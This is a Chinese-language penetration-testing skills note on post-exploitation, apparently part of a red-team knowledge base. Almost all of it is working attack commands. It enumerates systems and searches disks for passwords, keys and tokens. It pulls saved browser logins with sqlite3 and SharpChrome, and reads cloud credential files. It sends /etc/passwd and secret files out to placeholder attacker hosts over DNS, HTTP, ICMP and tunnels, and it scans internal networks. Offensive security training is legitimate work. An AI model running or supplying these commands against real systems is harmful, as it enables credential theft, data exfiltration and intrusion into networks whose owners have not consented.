---
id: 05-001
title: "🕵️ 后渗透信息收集与数据窃取 (Post-Exploitation Info Gathering & Data Exfil)"
category: 后渗透
category_en: Post-Exploitation
difficulty: ★★★
tools: "系统命令, Powerview, 自定义脚本"
last_updated: 2025-07
tags: ["post-exploitation", "credential-access", "data-exfiltration", "remote-control"]
subdomain: post-exploitation
nist_csf: ["PR.AC-01", "PR.DS-05"]
mitre_attack: ["T1003", "T1555", "T1055", "T1021"]
---
# 🕵️ 后渗透信息收集与数据窃取 (Post-Exploitation Info Gathering & Data Exfil)

## 概述
获得系统访问权限后，全面收集系统信息、用户数据、网络拓扑等敏感信息，并为数据外传做好准备。

## 核心技能

### 1. 系统信息全面收集

```bash
# Linux系统信息
uname -a                                    # 内核版本
cat /etc/os-release                         # OS版本
hostname                                    # 主机名
ip addr                                     # 网络接口
cat /etc/resolv.conf                        # DNS配置
cat /etc/hosts                              # 主机映射
mount                                       # 挂载点
df -h                                       # 磁盘空间
lsof -i                                     # 网络连接
ps aux                                      # 进程列表
lsmod                                       # 加载的内核模块
cat /etc/fstab                              # 文件系统表

# Windows系统信息 (CMD)
systeminfo
ipconfig /all
netstat -ano
tasklist /v
wmic product get name,version,vendor
wmic service get name,state,pathname
schtasks /query /fo LIST /v

# Windows系统信息 (PowerShell)
Get-ComputerInfo
Get-NetIPConfiguration
Get-NetTCPConnection -State Established
Get-Process | Select-Object Name,Id,Path,Company
Get-Service | Where-Object {$_.Status -eq "Running"}
Get-ScheduledTask | Where-Object {$_.State -ne "Disabled"}
```

### 2. 敏感文件搜索

```bash
# Linux敏感文件
find / -type f -name "*.txt" 2>/dev/null | xargs grep -i "password\|secret\|key\|token" 2>/dev/null
find / -type f -name "*.conf" -o -name "*.config" 2>/dev/null | xargs grep -i "password\|secret" 2>/dev/null
find / -type f -name "*.log" 2>/dev/null | xargs grep -i "password\|failed\|error" 2>/dev/null
find / -type f -name "*.db" -o -name "*.sqlite" -o -name "*.mdb" 2>/dev/null
find / -type f \( -name "*.pem" -o -name "*.key" -o -name "*.crt" \) 2>/dev/null

# Windows敏感文件 (PowerShell)
Get-ChildItem -Path C:\ -Recurse -Include *.txt,*.xml,*.ini,*.config -ErrorAction SilentlyContinue | Select-String -Pattern "password|secret|connectionstring" -SimpleMatch
Get-ChildItem -Path %USERPROFILE%\Desktop -Recurse -Include *.txt,*.doc,*.docx,*.xls,*.xlsx,*.pdf
Get-ChildItem -Path C:\inetpub -Recurse -Include web.config -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Windows\System32\config -ErrorAction SilentlyContinue
```

### 3. 浏览器数据提取

```bash
# Linux浏览器
# Chrome
ls ~/.config/google-chrome/Default/
sqlite3 ~/.config/google-chrome/Default/Login\ Data "SELECT origin_url, username_value, password_value FROM logins;"

# Firefox
ls ~/.mozilla/firefox/*.default-release/
# 使用firefox_decrypt

# Windows浏览器 (使用工具)
SharpChrome.exe logins /target:Chrome
SharpChrome.exe logins /target:Edge
SharpChrome.exe logins /target:Firefox

# 浏览器历史记录
SharpChrome.exe history /target:Chrome
```

### 4. 数据外传技术

```bash
# 使用DNS外传
# 攻击机监听
tcpdump -i eth0 'udp port 53' | grep "exfil"

# 目标机发送
cat /etc/passwd | base64 -w0 | while read data; do
  for i in $(seq 1 ${#data}); do
    char=${data:$i-1:1}
    nslookup $char.$i.example.com YOUR_DNS_SERVER
  done
done

# 使用HTTP外传
# 攻击机
python3 -m http.server 8080

# 目标机
curl -s -X POST --data-urlencode "data=$(cat /etc/passwd | base64 -w0)" http://YOUR_IP:8080/exfil
wget --post-data="data=$(cat secret.txt | base64)" http://YOUR_IP:8080/

# 使用ICMP外传
# 攻击机监听
tcpdump -i eth0 'icmp'

# 目标机
ping -c 1 -p "$(echo 'secret' | xxd -p)" YOUR_IP

# 使用隐蔽通道
# 使用dnscat2
# 攻击机
ruby dnscat2.rb --dns "domain=example.com" --no-cache
# 目标机
dnscat2 --dns server=example.com

# 使用HTTP隧道
# 使用tunna
python tunna.py -u "http://target.com/upload/shell.php" -l 127.0.0.1 -r 3389 -p 8080

# 大文件分块上传
split -b 1M secret_data.zip chunk_
for f in chunk_*; do
  curl -s -F "file=@$f" http://YOUR_IP:8080/upload
  rm $f
done
```

### 5. 网络拓扑探测

```bash
# Linux内网探测
# 使用系统工具
arp -a                                     # ARP表
route -n                                   # 路由表
ip neigh                                   # 邻居发现
cat /etc/networks                          # 网络配置
nmblookup -A 10.0.0.1                     # NetBIOS查询

# 内网端口扫描
for i in {1..254}; do
  (ping -c 1 10.0.0.$i >/dev/null && echo "10.0.0.$i is alive") &
done; wait

# 快速端口扫描（使用bash）
for port in 22 80 443 445 3389 8080 3306 1433 6379 9200; do
  (timeout 2 bash -c "echo > /dev/tcp/10.0.0.1/$port" 2>/dev/null && echo "Port $port open") &
done; wait

# Windows内网探测
arp -a
route print
net view
nbtstat -A 10.0.0.1
nslookup 10.0.0.1

# 使用PowerShell扫描
1..254 | ForEach-Object {
  if (Test-Connection -ComputerName "10.0.0.$_" -Count 1 -Quiet) {
    "10.0.0.$_ is alive"
  }
}
```

### 6. 应用数据提取

```bash
# 数据库导出
# MySQL
mysqldump -u root -p --all-databases > all_dbs.sql

# PostgreSQL
pg_dumpall -U postgres > all_dbs.sql

# MSSQL
sqlcmd -S . -E -Q "BACKUP DATABASE [DBName] TO DISK='C:\backup.bak'"

# 邮件数据
# Outlook
# 位置: %USERPROFILE%\AppData\Local\Microsoft\Outlook\
dir /s *.pst

# 云服务配置
# AWS
cat ~/.aws/credentials
cat ~/.aws/config
# Azure
cat ~/.azure/credentials
# GCP
cat ~/.config/gcloud/credentials
```

## 数据优先级分级

| 优先级 | 数据类型 | 示例 |
|:---:|:---|:---|
| 🔴 关键 | 域控凭证、KRBTGT哈希 | 域管理员密码 |
| 🟠 高 | 本地管理员密码、SSL密钥 | 服务器私钥 |
| 🟡 中 | 业务数据、数据库 | 客户信息 |
| 🟢 低 | 系统配置文件 | 网络配置 |

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| dnscat2 | DNS隧道 | https://github.com/iagox86/dnscat2 |
| Chisel | TCP/UDP隧道 | https://github.com/jpillora/chisel |
| SharpChrome | Chrome数据提取 | https://github.com/GhostPack/SharpDPAPI |
| LaZagne | 密码提取 | https://github.com/AlessandroZ/LaZagne |
| BloodHound | AD关系分析 | https://github.com/BloodHoundAD/BloodHound |
| Nmap | 内网扫描 | https://nmap.org/ |

## 参考资源
- [HackTricks - Post Exploitation](https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology)
- [PayloadsAllTheThings - Data Exfiltration](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Data%20Exfiltration)
- [Living Off The Land](https://lolbas-project.github.io/)
